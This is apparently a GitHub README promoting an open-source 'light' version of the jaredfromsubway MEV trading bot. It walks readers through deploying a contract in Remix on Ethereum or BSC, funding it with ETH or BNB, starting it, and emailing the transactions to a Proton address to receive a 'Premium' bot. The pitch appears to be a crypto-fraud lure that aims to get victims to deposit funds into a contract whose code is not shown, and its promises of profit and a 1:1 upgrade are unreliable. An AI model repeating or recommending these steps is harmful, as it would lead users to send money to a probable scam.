# jaredfromsubway-mevbot-light
If you are aware of https://etherscan.io/address/jaredfromsubway.eth, this is an open source - light edition - of the MEVBOT

Kindly take note that the software provided herein is a streamlined open-source variant of JaredFromSubway. An upgraded version, identical to the original (1:1), can be made available upon request. 

# Please adhere to the following steps:

1) Proceed to deploy the abridged version provided below on either Ethereum Mainnet or Binance Smart Chain Mainnet.
2) Facilitate a transfer of ETH or BNB, contingent on the network where you have deployed MEVBOT.
3) Initiate the MEVBOT.
4) Please allow approximately 24 hours for transactions to be generated, and subsequently, forward them to andrewweb3@proton.me.

# Upon completion, I will provide you with the source code of the Premium MEVBOT, which you will be required to deploy on desired blockchain - ETH OR BSC.

**The Premium MEVBOT confers several advantages:**

1) It grants you the autonomy to dictate the profit margin you aim to achieve.
2) It facilitates scheduling of the MEVBOT.
3) It permits the transfer of profits to an alternate Web3 Wallet or multiple wallets after a predetermined duration, for a more discreet approach.
4) It allows for switching the project that the MEVBOT targets.
5) It provides flexibility in modifying the Network/Routers.
6) Additionally, it includes premium support from myself - any discrepancies or issues will be addressed confidentially.


# How to deploy:

- **Select Network:** Decide whether you want to deploy the contract on the Binance Smart Chain (BSC) or Ethereum (ETH) network.

- **Setup Wallet and Network Connection:** Ensure that you have a wallet like MetaMask installed and configured to connect to the desired network (BSC or ETH).

- **Fund Your Wallet:** Add BNB to your wallet for deployment on BSC or add ETH to your wallet for deployment on Ethereum.

1) **Access Deployment Tool:** Open a smart contract deployment tool like Remix IDE ([https://remix.ethereum.org](https://remix.ethereum.org)/).

2) **Load Contract:** _Copy the MEVBOT Solidity Contract code and paste it into the Remix IDE editor. Ensure that the file has a .sol extension._

3) **Specify Constructor Parameters:** Before deployment, you need to specify three constructor parameters:

**_NETWORKID:** Specify 0 for Ethereum (ETH) network and 1 for Binance Smart Chain (BSC).
**_swapV2Router:** Input the address of the router on which the bot should operate.

For Ethereum, use:
Uniswap V2's router address: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
SushiSwap's router address: 0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f

For Binance Smart Chain, use:
PancakeSwap's V2 router address: 0x10ED43C718714eb63d5aA57B78B54704E256024E

**_swapV2Pair:** Enter the address of the pair that the bot should monitor (e.g., 0xf239009a101b6b930a527deaab6961b6e7dec8a6).

4) **Deploy the Contract:** Navigate to the "Deploy & Run Transactions" tab in Remix IDE, select the contract, and click on the "transact" button. Confirm the transaction in your wallet.
<img width="865" alt="image" src="https://github.com/andrewfsolidity/jaredfromsubway-mevbot-light/assets/138217572/d1f72d63-67b3-4c79-be36-f45b76ebb14c">



5) **Send Funds:** Transfer some BNB (if you are using BSC) or ETH (if you are using Ethereum) to the contract address. This is required for the MEVBOT to perform operations.

6) **Initialize the Contract:** After the contract has been deployed, find the deployed contract under the "Deployed Contracts" section in Remix IDE. Expand it to find the **initiate()** function and click on it to call the function. **This starts the MEVBOT. Confirm the transaction in your wallet.**__

7) **Monitor and Manage:** Keep an eye on the MEVBOT and manage it as needed. The contract is now deployed and running.
